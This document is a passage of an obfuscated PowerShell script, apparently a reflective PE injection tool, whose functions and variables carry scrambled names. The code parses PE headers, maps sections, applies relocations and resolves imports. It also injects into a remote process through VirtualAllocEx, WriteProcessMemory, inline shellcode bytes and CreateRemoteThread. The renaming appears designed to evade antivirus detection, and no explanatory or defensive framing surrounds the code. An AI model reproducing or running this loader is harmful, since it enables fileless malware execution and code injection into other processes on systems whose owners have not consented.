			[IntPtr]$PjRLYAcH99 = [IntPtr](sane ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LJGBrAPz99.IMAGE_NT_HEADERS32)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $PjRLYAcH99
		}
		
		if (($RZehjWou99.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
		}
		elseif (($RZehjWou99.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
		}
		else
		{
			Throw "PE file is not an EXE or DLL"
		}
		
		return $PEInfo
	}
	
	
	Function resignation
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$MVHuzxUH99,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$scYOgelx99
		)
		
		$sxlJVNvv99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		$GJLpePUa99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($scYOgelx99)
		$bDMbAMBf99 = [UIntPtr][UInt64]([UInt64]$GJLpePUa99.Length + 1)
		$PjAYwCEx99 = $HDWlOjKv99.VirtualAllocEx.Invoke($MVHuzxUH99, [IntPtr]::Zero, $bDMbAMBf99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($PjAYwCEx99 -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}
		[UIntPtr]$IbYSYUiw99 = [UIntPtr]::Zero
		$GBrhDMbN99 = $HDWlOjKv99.WriteProcessMemory.Invoke($MVHuzxUH99, $PjAYwCEx99, $scYOgelx99, $bDMbAMBf99, [Ref]$IbYSYUiw99)
		
		if ($GBrhDMbN99 -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($bDMbAMBf99 -ne $IbYSYUiw99)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		
		$wByIWjwr99 = $HDWlOjKv99.GetModuleHandle.Invoke("kernel32.dll")
		$xTFhyxeD99 = $HDWlOjKv99.GetProcAddress.Invoke($wByIWjwr99, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
		
		[IntPtr]$vnjiDtEj99 = [IntPtr]::Zero
		if ($PEInfo.PE64Bit -eq $true)
		{
			$sShGIcKo99 = $HDWlOjKv99.VirtualAllocEx.Invoke($MVHuzxUH99, [IntPtr]::Zero, $bDMbAMBf99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			if ($sShGIcKo99 -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
			}
			
			
			$SaypFfML99 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$OrZdAHPX99 = @(0x48, 0xba)
			$NIIzvqoi99 = @(0xff, 0xd2, 0x48, 0xba)
			$WYGCzfpN99 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			
			$dOUUBGSF99 = $SaypFfML99.Length + $OrZdAHPX99.Length + $NIIzvqoi99.Length + $WYGCzfpN99.Length + ($sxlJVNvv99 * 3)
			$JLEzydEF99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($dOUUBGSF99)
			$hqEXhEBt99 = $JLEzydEF99
			
			uninteresting -Bytes $SaypFfML99 -xOESEpLd99 $JLEzydEF99
			$JLEzydEF99 = sane $JLEzydEF99 ($SaypFfML99.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($PjAYwCEx99, $JLEzydEF99, $false)
			$JLEzydEF99 = sane $JLEzydEF99 ($sxlJVNvv99)
			uninteresting -Bytes $OrZdAHPX99 -xOESEpLd99 $JLEzydEF99
			$JLEzydEF99 = sane $JLEzydEF99 ($OrZdAHPX99.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($xTFhyxeD99, $JLEzydEF99, $false)
			$JLEzydEF99 = sane $JLEzydEF99 ($sxlJVNvv99)
			uninteresting -Bytes $NIIzvqoi99 -xOESEpLd99 $JLEzydEF99
			$JLEzydEF99 = sane $JLEzydEF99 ($NIIzvqoi99.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($sShGIcKo99, $JLEzydEF99, $false)
			$JLEzydEF99 = sane $JLEzydEF99 ($sxlJVNvv99)
			uninteresting -Bytes $WYGCzfpN99 -xOESEpLd99 $JLEzydEF99
			$JLEzydEF99 = sane $JLEzydEF99 ($WYGCzfpN99.Length)
			
			$UOYTtWGG99 = $HDWlOjKv99.VirtualAllocEx.Invoke($MVHuzxUH99, [IntPtr]::Zero, [UIntPtr][UInt64]$dOUUBGSF99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($UOYTtWGG99 -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for shellcode"
			}
			
			$GBrhDMbN99 = $HDWlOjKv99.WriteProcessMemory.Invoke($MVHuzxUH99, $UOYTtWGG99, $hqEXhEBt99, [UIntPtr][UInt64]$dOUUBGSF99, [Ref]$IbYSYUiw99)
			if (($GBrhDMbN99 -eq $false) -or ([UInt64]$IbYSYUiw99 -ne [UInt64]$dOUUBGSF99))
			{
				Throw "Unable to write shellcode to remote process memory."
			}
			
			$MeyTOpXT99 = braziers -qXvylkCO99 $MVHuzxUH99 -StartAddress $UOYTtWGG99 -HDWlOjKv99 $HDWlOjKv99
			$RdmPlRRb99 = $HDWlOjKv99.WaitForSingleObject.Invoke($MeyTOpXT99, 20000)
			if ($RdmPlRRb99 -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			[IntPtr]$KatEnxUg99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($sxlJVNvv99)
			$RdmPlRRb99 = $HDWlOjKv99.ReadProcessMemory.Invoke($MVHuzxUH99, $sShGIcKo99, $KatEnxUg99, [UIntPtr][UInt64]$sxlJVNvv99, [Ref]$IbYSYUiw99)
			if ($RdmPlRRb99 -eq $false)
			{
				Throw "Call to ReadProcessMemory failed"
			}
			[IntPtr]$vnjiDtEj99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($KatEnxUg99, [Type][IntPtr])
			$HDWlOjKv99.VirtualFreeEx.Invoke($MVHuzxUH99, $sShGIcKo99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			$HDWlOjKv99.VirtualFreeEx.Invoke($MVHuzxUH99, $UOYTtWGG99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]$MeyTOpXT99 = braziers -qXvylkCO99 $MVHuzxUH99 -StartAddress $xTFhyxeD99 -wSzHRtVc99 $PjAYwCEx99 -HDWlOjKv99 $HDWlOjKv99
			$RdmPlRRb99 = $HDWlOjKv99.WaitForSingleObject.Invoke($MeyTOpXT99, 20000)
			if ($RdmPlRRb99 -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			[Int32]$GClUQdIi99 = 0
			$RdmPlRRb99 = $HDWlOjKv99.GetExitCodeThread.Invoke($MeyTOpXT99, [Ref]$GClUQdIi99)
			if (($RdmPlRRb99 -eq 0) -or ($GClUQdIi99 -eq 0))
			{
				Throw "Call to GetExitCodeThread failed"
			}
			
			[IntPtr]$vnjiDtEj99 = [IntPtr]$GClUQdIi99
		}
		
		$HDWlOjKv99.VirtualFreeEx.Invoke($MVHuzxUH99, $PjAYwCEx99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		return $vnjiDtEj99
	}
	
	
	Function ignited
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$MVHuzxUH99,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$VCMZGwwK99,
		
		[Parameter(Position=2, Mandatory=$true)]
		[String]
		$FunctionName
		)
		$sxlJVNvv99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		$CwpXVmSa99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($FunctionName)
		
		$nqrdVCFC99 = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
		$gnWxKFyG99 = $HDWlOjKv99.VirtualAllocEx.Invoke($MVHuzxUH99, [IntPtr]::Zero, $nqrdVCFC99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($gnWxKFyG99 -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}
		[UIntPtr]$IbYSYUiw99 = [UIntPtr]::Zero
		$GBrhDMbN99 = $HDWlOjKv99.WriteProcessMemory.Invoke($MVHuzxUH99, $gnWxKFyG99, $CwpXVmSa99, $nqrdVCFC99, [Ref]$IbYSYUiw99)
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($CwpXVmSa99)
		if ($GBrhDMbN99 -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($nqrdVCFC99 -ne $IbYSYUiw99)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		
		$wByIWjwr99 = $HDWlOjKv99.GetModuleHandle.Invoke("kernel32.dll")
		$ORjxNcai99 = $HDWlOjKv99.GetProcAddress.Invoke($wByIWjwr99, "GetProcAddress") #Kernel32 loaded to the same address for all processes
		
		$GhropXNz99 = $HDWlOjKv99.VirtualAllocEx.Invoke($MVHuzxUH99, [IntPtr]::Zero, [UInt64][UInt64]$sxlJVNvv99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($GhropXNz99 -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
		}
		
		
		[Byte[]]$dYxKsKfb99 = @()
		if ($PEInfo.PE64Bit -eq $true)
		{
			$LbEBQGJK99 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$oyVZJOky99 = @(0x48, 0xba)
			$nyZcWwAm99 = @(0x48, 0xb8)
			$xdcINqnZ99 = @(0xff, 0xd0, 0x48, 0xb9)
			$iPpKlygB99 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			$LbEBQGJK99 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			$oyVZJOky99 = @(0xb9)
			$nyZcWwAm99 = @(0x51, 0x50, 0xb8)
			$xdcINqnZ99 = @(0xff, 0xd0, 0xb9)
			$iPpKlygB99 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		$dOUUBGSF99 = $LbEBQGJK99.Length + $oyVZJOky99.Length + $nyZcWwAm99.Length + $xdcINqnZ99.Length + $iPpKlygB99.Length + ($sxlJVNvv99 * 4)
		$JLEzydEF99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($dOUUBGSF99)
		$hqEXhEBt99 = $JLEzydEF99
		
		uninteresting -Bytes $LbEBQGJK99 -xOESEpLd99 $JLEzydEF99
		$JLEzydEF99 = sane $JLEzydEF99 ($LbEBQGJK99.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($VCMZGwwK99, $JLEzydEF99, $false)
		$JLEzydEF99 = sane $JLEzydEF99 ($sxlJVNvv99)
		uninteresting -Bytes $oyVZJOky99 -xOESEpLd99 $JLEzydEF99
		$JLEzydEF99 = sane $JLEzydEF99 ($oyVZJOky99.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($gnWxKFyG99, $JLEzydEF99, $false)
		$JLEzydEF99 = sane $JLEzydEF99 ($sxlJVNvv99)
		uninteresting -Bytes $nyZcWwAm99 -xOESEpLd99 $JLEzydEF99
		$JLEzydEF99 = sane $JLEzydEF99 ($nyZcWwAm99.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($ORjxNcai99, $JLEzydEF99, $false)
		$JLEzydEF99 = sane $JLEzydEF99 ($sxlJVNvv99)
		uninteresting -Bytes $xdcINqnZ99 -xOESEpLd99 $JLEzydEF99
		$JLEzydEF99 = sane $JLEzydEF99 ($xdcINqnZ99.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GhropXNz99, $JLEzydEF99, $false)
		$JLEzydEF99 = sane $JLEzydEF99 ($sxlJVNvv99)
		uninteresting -Bytes $iPpKlygB99 -xOESEpLd99 $JLEzydEF99
		$JLEzydEF99 = sane $JLEzydEF99 ($iPpKlygB99.Length)
		
		$UOYTtWGG99 = $HDWlOjKv99.VirtualAllocEx.Invoke($MVHuzxUH99, [IntPtr]::Zero, [UIntPtr][UInt64]$dOUUBGSF99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
		if ($UOYTtWGG99 -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for shellcode"
		}
		
		$GBrhDMbN99 = $HDWlOjKv99.WriteProcessMemory.Invoke($MVHuzxUH99, $UOYTtWGG99, $hqEXhEBt99, [UIntPtr][UInt64]$dOUUBGSF99, [Ref]$IbYSYUiw99)
		if (($GBrhDMbN99 -eq $false) -or ([UInt64]$IbYSYUiw99 -ne [UInt64]$dOUUBGSF99))
		{
			Throw "Unable to write shellcode to remote process memory."
		}
		
		$MeyTOpXT99 = braziers -qXvylkCO99 $MVHuzxUH99 -StartAddress $UOYTtWGG99 -HDWlOjKv99 $HDWlOjKv99
		$RdmPlRRb99 = $HDWlOjKv99.WaitForSingleObject.Invoke($MeyTOpXT99, 20000)
		if ($RdmPlRRb99 -ne 0)
		{
			Throw "Call to CreateRemoteThread to call GetProcAddress failed."
		}
		
		[IntPtr]$KatEnxUg99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($sxlJVNvv99)
		$RdmPlRRb99 = $HDWlOjKv99.ReadProcessMemory.Invoke($MVHuzxUH99, $GhropXNz99, $KatEnxUg99, [UIntPtr][UInt64]$sxlJVNvv99, [Ref]$IbYSYUiw99)
		if (($RdmPlRRb99 -eq $false) -or ($IbYSYUiw99 -eq 0))
		{
			Throw "Call to ReadProcessMemory failed"
		}
		[IntPtr]$vWtbEiml99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($KatEnxUg99, [Type][IntPtr])
		$HDWlOjKv99.VirtualFreeEx.Invoke($MVHuzxUH99, $UOYTtWGG99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$HDWlOjKv99.VirtualFreeEx.Invoke($MVHuzxUH99, $gnWxKFyG99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$HDWlOjKv99.VirtualFreeEx.Invoke($MVHuzxUH99, $GhropXNz99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		return $vWtbEiml99
	}
	Function Saussure
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$GPmJoDbZ99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$HDWlOjKv99,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$LJGBrAPz99
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$PjRLYAcH99 = [IntPtr](sane ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LJGBrAPz99.IMAGE_SECTION_HEADER)))
			$cICWXukM99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PjRLYAcH99, [Type]$LJGBrAPz99.IMAGE_SECTION_HEADER)
		
			[IntPtr]$YVbtkkjd99 = [IntPtr](sane ([Int64]$PEInfo.PEHandle) ([Int64]$cICWXukM99.VirtualAddress))
			
			$dyhvbJAf99 = $cICWXukM99.SizeOfRawData
			if ($cICWXukM99.PointerToRawData -eq 0)
			{
				$dyhvbJAf99 = 0
			}
			
			if ($dyhvbJAf99 -gt $cICWXukM99.VirtualSize)
			{
				$dyhvbJAf99 = $cICWXukM99.VirtualSize
			}
			
			if ($dyhvbJAf99 -gt 0)
			{
				chirped -JsYGPiYm99 "Saussure::MarshalCopy" -PEInfo $PEInfo -StartAddress $YVbtkkjd99 -Size $dyhvbJAf99 | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy($GPmJoDbZ99, [Int32]$cICWXukM99.PointerToRawData, $YVbtkkjd99, $dyhvbJAf99)
			}
		
			if ($cICWXukM99.SizeOfRawData -lt $cICWXukM99.VirtualSize)
			{
				$yIMUJWbu99 = $cICWXukM99.VirtualSize - $dyhvbJAf99
				[IntPtr]$StartAddress = [IntPtr](sane ([Int64]$YVbtkkjd99) ([Int64]$dyhvbJAf99))
				chirped -JsYGPiYm99 "Saussure::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $yIMUJWbu99 | Out-Null
				$HDWlOjKv99.memset.Invoke($StartAddress, 0, [IntPtr]$yIMUJWbu99) | Out-Null
			}
		}
	}
	Function Popper
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$PvcZTBPG99,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$LJGBrAPz99
		)
		
		[Int64]$GFHQHCFY99 = 0
		$xpLIkVSw99 = $true #Track if the difference variable should be added or subtracted from variables
		[UInt32]$HvMYzWCB99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LJGBrAPz99.IMAGE_BASE_RELOCATION)
		
		if (($PvcZTBPG99 -eq [Int64]$PEInfo.EffectivePEHandle) `
				-or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}
		elseif ((penologists ($PvcZTBPG99) ($PEInfo.EffectivePEHandle)) -eq $true)
		{
			$GFHQHCFY99 = veracious ($PvcZTBPG99) ($PEInfo.EffectivePEHandle)
			$xpLIkVSw99 = $false
		}
		elseif ((penologists ($PEInfo.EffectivePEHandle) ($PvcZTBPG99)) -eq $true)
		{
			$GFHQHCFY99 = veracious ($PEInfo.EffectivePEHandle) ($PvcZTBPG99)
		}
		
		[IntPtr]$LrEdCYwh99 = [IntPtr](sane ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{
			$qySslrhi99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LrEdCYwh99, [Type]$LJGBrAPz99.IMAGE_BASE_RELOCATION)
			if ($qySslrhi99.SizeOfBlock -eq 0)
			{
				break
			}
			[IntPtr]$mthswrRu99 = [IntPtr](sane ([Int64]$PEInfo.PEHandle) ([Int64]$qySslrhi99.VirtualAddress))
			$YXaINafP99 = ($qySslrhi99.SizeOfBlock - $HvMYzWCB99) / 2
			for($i = 0; $i -lt $YXaINafP99; $i++)
			{
				$qvUPeroq99 = [IntPtr](sane ([IntPtr]$LrEdCYwh99) ([Int64]$HvMYzWCB99 + (2 * $i)))
				[UInt16]$ihlwCvkF99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($qvUPeroq99, [Type][UInt16])
				[UInt16]$vnenaUop99 = $ihlwCvkF99 -band 0x0FFF
				[UInt16]$EBxWIBVA99 = $ihlwCvkF99 -band 0xF000
				for ($j = 0; $j -lt 12; $j++)
				{
					$EBxWIBVA99 = [Math]::Floor($EBxWIBVA99 / 2)
				}
				if (($EBxWIBVA99 -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
						-or ($EBxWIBVA99 -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
				{			
					[IntPtr]$rbgwYfeG99 = [IntPtr](sane ([Int64]$mthswrRu99) ([Int64]$vnenaUop99))
					[IntPtr]$VDNwUxTj99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($rbgwYfeG99, [Type][IntPtr])
		
					if ($xpLIkVSw99 -eq $true)
					{
						[IntPtr]$VDNwUxTj99 = [IntPtr](sane ([Int64]$VDNwUxTj99) ($GFHQHCFY99))
					}
					else
					{
						[IntPtr]$VDNwUxTj99 = [IntPtr](veracious ([Int64]$VDNwUxTj99) ($GFHQHCFY99))
					}				
					[System.Runtime.InteropServices.Marshal]::StructureToPtr($VDNwUxTj99, $rbgwYfeG99, $false) | Out-Null
				}
				elseif ($EBxWIBVA99 -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
				{
					Throw "Unknown relocation found, relocation value: $EBxWIBVA99, relocationinfo: $ihlwCvkF99"
				}
			}
			
			$LrEdCYwh99 = [IntPtr](sane ([Int64]$LrEdCYwh99) ([Int64]$qySslrhi99.SizeOfBlock))
		}
	}
	Function restful
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$HDWlOjKv99,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$LJGBrAPz99,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 4, Mandatory = $false)]
		[IntPtr]
		$MVHuzxUH99
		)
		
		$KiTwYyuX99 = $false
		if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
		{
			$KiTwYyuX99 = $true
		}
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$xuiqRfpr99 = sane ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ZhCSxMvd99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($xuiqRfpr99, [Type]$LJGBrAPz99.IMAGE_IMPORT_DESCRIPTOR)
				
				if ($ZhCSxMvd99.Characteristics -eq 0 `
						-and $ZhCSxMvd99.FirstThunk -eq 0 `
						-and $ZhCSxMvd99.ForwarderChain -eq 0 `
						-and $ZhCSxMvd99.Name -eq 0 `
						-and $ZhCSxMvd99.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done importing DLL imports"
					break
				}
				$YusZtKIH99 = [IntPtr]::Zero
				$scYOgelx99 = (sane ([Int64]$PEInfo.PEHandle) ([Int64]$ZhCSxMvd99.Name))
				$GJLpePUa99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($scYOgelx99)
				
				if ($KiTwYyuX99 -eq $true)
				{
					$YusZtKIH99 = resignation -MVHuzxUH99 $MVHuzxUH99 -scYOgelx99 $scYOgelx99
				}
				else
				{
					$YusZtKIH99 = $HDWlOjKv99.LoadLibrary.Invoke($GJLpePUa99)
				}
				if (($YusZtKIH99 -eq $null) -or ($YusZtKIH99 -eq [IntPtr]::Zero))
				{
					throw "Error importing DLL, DLLName: $GJLpePUa99"
				}
				
				[IntPtr]$bawTNTyD99 = sane ($PEInfo.PEHandle) ($ZhCSxMvd99.FirstThunk)
				[IntPtr]$krEFxdyW99 = sane ($PEInfo.PEHandle) ($ZhCSxMvd99.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
				[IntPtr]$RemviTIo99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($krEFxdyW99, [Type][IntPtr])
				
				while ($RemviTIo99 -ne [IntPtr]::Zero)
				{
					$pSFEgbZQ99 = ''
					[IntPtr]$KZkVyBne99 = [IntPtr]::Zero
					if([Int64]$RemviTIo99 -lt 0)
					{
						$pSFEgbZQ99 = [Int64]$RemviTIo99 -band 0xffff #This is actually a lookup by ordinal
					}
					else
					{
						[IntPtr]$UbbFEtfT99 = sane ($PEInfo.PEHandle) ($RemviTIo99)
						$UbbFEtfT99 = sane $UbbFEtfT99 ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						$pSFEgbZQ99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($UbbFEtfT99)
					}
					
					if ($KiTwYyuX99 -eq $true)
					{
						[IntPtr]$KZkVyBne99 = ignited -MVHuzxUH99 $MVHuzxUH99 -VCMZGwwK99 $YusZtKIH99 -FunctionName $pSFEgbZQ99
					}
                    else
					{
						if($pSFEgbZQ99 -is [string])
						{
						    [IntPtr]$KZkVyBne99 = $HDWlOjKv99.GetProcAddress.Invoke($YusZtKIH99, $pSFEgbZQ99)
						}
						else
						{
						    [IntPtr]$KZkVyBne99 = $HDWlOjKv99.GetProcAddressOrdinal.Invoke($YusZtKIH99, $pSFEgbZQ99)
						}
					}
					
					if ($KZkVyBne99 -eq $null -or $KZkVyBne99 -eq [IntPtr]::Zero)
					{
						Throw "New function reference is null, this is almost certainly a bug in this script. Function: $pSFEgbZQ99. Dll: $GJLpePUa99"
					}
					[System.Runtime.InteropServices.Marshal]::StructureToPtr($KZkVyBne99, $bawTNTyD99, $false)
					
					$bawTNTyD99 = sane ([Int64]$bawTNTyD99) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$krEFxdyW99 = sane ([Int64]$krEFxdyW99) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$RemviTIo99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($krEFxdyW99, [Type][IntPtr])
				}
				
				$xuiqRfpr99 = sane ($xuiqRfpr99) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LJGBrAPz99.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}
	Function parameters
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		$vWIaueOq99
		)
		
		$HoOtKCvW99 = 0x0
		if (($vWIaueOq99 -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if (($vWIaueOq99 -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($vWIaueOq99 -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$HoOtKCvW99 = $Win32Constants.PAGE_EXECUTE_READWRITE
				}
				else
				{
					$HoOtKCvW99 = $Win32Constants.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if (($vWIaueOq99 -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$HoOtKCvW99 = $Win32Constants.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					$HoOtKCvW99 = $Win32Constants.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if (($vWIaueOq99 -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($vWIaueOq99 -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$HoOtKCvW99 = $Win32Constants.PAGE_READWRITE
				}
				else
				{
					$HoOtKCvW99 = $Win32Constants.PAGE_READONLY
				}
			}
			else
			{
				if (($vWIaueOq99 -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$HoOtKCvW99 = $Win32Constants.PAGE_WRITECOPY
				}
				else
				{
					$HoOtKCvW99 = $Win32Constants.PAGE_NOACCESS
				}
			}
		}
		
		if (($vWIaueOq99 -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			$HoOtKCvW99 = $HoOtKCvW99 -bor $Win32Constants.PAGE_NOCACHE
		}
		
		return $HoOtKCvW99
	}
	Function awkwardness
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$HDWlOjKv99,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$LJGBrAPz99
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$PjRLYAcH99 = [IntPtr](sane ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LJGBrAPz99.IMAGE_SECTION_HEADER)))
			$cICWXukM99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PjRLYAcH99, [Type]$LJGBrAPz99.IMAGE_SECTION_HEADER)
			[IntPtr]$MmVEuNti99 = sane ($PEInfo.PEHandle) ($cICWXukM99.VirtualAddress)
			
			[UInt32]$VGDFPqWv99 = parameters $cICWXukM99.Characteristics
			[UInt32]$TGyydnHP99 = $cICWXukM99.VirtualSize
			
			[UInt32]$xgrvTZjv99 = 0
			chirped -JsYGPiYm99 "awkwardness::VirtualProtect" -PEInfo $PEInfo -StartAddress $MmVEuNti99 -Size $TGyydnHP99 | Out-Null
